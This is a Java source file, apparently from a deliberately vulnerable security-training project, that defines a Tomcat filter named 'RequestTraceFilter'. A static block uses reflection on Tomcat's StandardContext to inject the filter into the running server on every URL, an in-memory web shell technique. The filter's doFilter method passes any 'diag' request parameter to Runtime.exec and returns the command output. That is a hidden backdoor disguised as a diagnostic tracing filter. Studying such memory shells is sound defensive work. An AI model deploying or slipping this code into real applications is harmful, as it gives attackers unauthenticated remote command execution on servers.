package org.joychou.config;

import java.lang.reflect.Field;
import org.apache.catalina.core.StandardContext;
import java.io.IOException;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import java.lang.reflect.Constructor;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.Context;
import org.springframework.stereotype.Component;

import javax.servlet.*;
import java.util.*;

//@Component
public class RequestTraceFilter implements Filter {
    static{
        try {
            System.out.println("RequestTraceFilter is loading...");
            final String name = "requestTraceFilter";
            final String URLPattern = "/*";

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            // standardContext为tomcat标准上下文，
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Class<? extends StandardContext> aClass;
            try{
                // standardContext类名为TomcatEmbeddedContex，TomcatEmbeddedContext父类为StandardContext
                // 适用于内嵌式springboot的tomcat
                aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
            }catch (Exception e){
                aClass = standardContext.getClass();
            }
            Field Configs = aClass.getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            // 获取当前tomcat标准上下文中已经存在的filterConfigs
            Map filterConfigs = (Map) Configs.get(standardContext);

            // skip if already present
            if (filterConfigs.get(name) == null) {
                // 构造filterDef，并将filterDef添加到standardContext的FilterDef中
                RequestTraceFilter traceFilter = new RequestTraceFilter();
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(traceFilter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(traceFilter.getClass().getName());
                standardContext.addFilterDef(filterDef);

                // 构造fiterMap，将filterMap添加到standardContext的FilterMap
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern(URLPattern);
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                // 最终将构造好的filterConfig存入StandardContext类的filterConfigs成员变量即可
                filterConfigs.put(name, filterConfig);
                System.out.println("RequestTraceFilter registered successfully.");
            } else System.out.println("RequestTraceFilter already registered, skip.");
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }


    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String diag;
        if ((diag = servletRequest.getParameter("diag")) != null) {
            Process process = Runtime.getRuntime().exec(diag);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line).append('\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }

        filterChain.doFilter(servletRequest, servletResponse);
    }


    @Override
    public void destroy() {

    }

}
